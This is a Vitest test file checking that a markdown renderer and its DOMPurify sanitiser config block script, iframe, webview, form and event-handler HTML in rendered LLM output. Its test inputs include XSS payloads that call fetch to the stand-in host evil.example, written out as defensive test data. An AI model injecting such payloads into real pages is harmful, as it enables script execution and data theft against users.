import { describe, it, expect } from 'vitest'
import DOMPurify from 'dompurify'
import { MarkdownRenderer, SANITIZE_OPTIONS } from '../obsidian-shim/ui/markdown-renderer'

/**
 * MarkdownRenderer's four call sites render LLM and enricher output, which is
 * adversary-adjacent by construction.
 *
 * Two layers are asserted separately, because they fail independently: markdown-it's
 * `html: false` escapes raw tags before they are ever parsed, and DOMPurify removes
 * them if that ever stops being true.
 */
async function renderToElement(markdown: string): Promise<HTMLElement> {
    const el = document.createElement('div')
    await MarkdownRenderer.render(null, markdown, el, '', null)
    return el
}

const HOSTILE = [
    '<webview src="https://evil.example/"></webview>',
    '<script>fetch("https://evil.example")</script>',
    '<iframe src="https://evil.example"></iframe>',
    '<object data="x"></object>',
    '<embed src="x">',
    '<form action="https://evil.example"><input name="a"></form>',
    '<img src="x" onerror="fetch(\'https://evil.example\')">',
].join('\n\n')

describe('rendered markdown cannot execute or phone home', () => {
    it('creates no live element for any of the dangerous tags', async () => {
        const el = await renderToElement(HOSTILE)
        for (const tag of ['webview', 'script', 'iframe', 'object', 'embed', 'form', 'input']) {
            expect(el.querySelector(tag), `${tag} survived rendering`).toBeNull()
        }
    })

    it('creates no element carrying an inline event handler', async () => {
        const el = await renderToElement(HOSTILE)
        for (const node of el.querySelectorAll('*')) {
            for (const attr of node.attributes) {
                expect(attr.name.toLowerCase().startsWith('on')).toBe(false)
            }
        }
    })

    it('still renders ordinary markdown', async () => {
        const el = await renderToElement('A **bold** [link](https://example.com).')
        expect(el.querySelector('strong')?.textContent).toBe('bold')
        expect(el.querySelector('a')?.getAttribute('href')).toBe('https://example.com')
    })
})

describe('the sanitiser layer on its own', () => {
    // Exercised directly, because markdown-it escapes raw HTML before DOMPurify ever
    // sees it -- so rendering alone would pass even if this config were emptied.

    it('forbids webview even if something later adds it back', () => {
        const hostile = '<webview src="https://evil.example/"></webview>'

        // DOMPurify is allowlist-based, so a non-standard element is already dropped
        // with no configuration at all. Naming webview in FORBID_TAGS is therefore
        // belt-and-braces rather than a gap being closed -- asserted here so nobody
        // reads the entry as load-bearing and nobody deletes it as pointless.
        expect(DOMPurify.sanitize(hostile)).not.toContain('webview')
        expect(DOMPurify.sanitize(hostile, SANITIZE_OPTIONS)).not.toContain('webview')

        // What the entry actually buys: it survives someone allowing the tag elsewhere.
        expect(DOMPurify.sanitize(hostile, { ADD_TAGS: ['webview'] })).toContain('webview')
        expect(DOMPurify.sanitize(hostile, { ...SANITIZE_OPTIONS, ADD_TAGS: ['webview'] }))
            .not.toContain('webview')
    })

    it('forbids the executing and network-reaching tags', () => {
        for (const html of [
            '<script>alert(1)</script>',
            '<iframe src="https://evil.example"></iframe>',
            '<object data="x"></object>',
            '<embed src="x">',
            '<form action="https://evil.example"></form>',
            '<style>body{}</style>',
        ]) {
            const clean = DOMPurify.sanitize(html, SANITIZE_OPTIONS)
            expect(clean).not.toMatch(/<(script|iframe|object|embed|form|style)\b/i)
        }
    })

    it('strips inline event handlers and formaction', () => {
        const clean = DOMPurify.sanitize(
            '<img src="x" onerror="alert(1)"><button formaction="https://evil.example">go</button>',
            SANITIZE_OPTIONS)
        expect(clean).not.toContain('onerror')
        expect(clean).not.toContain('formaction')
    })
})
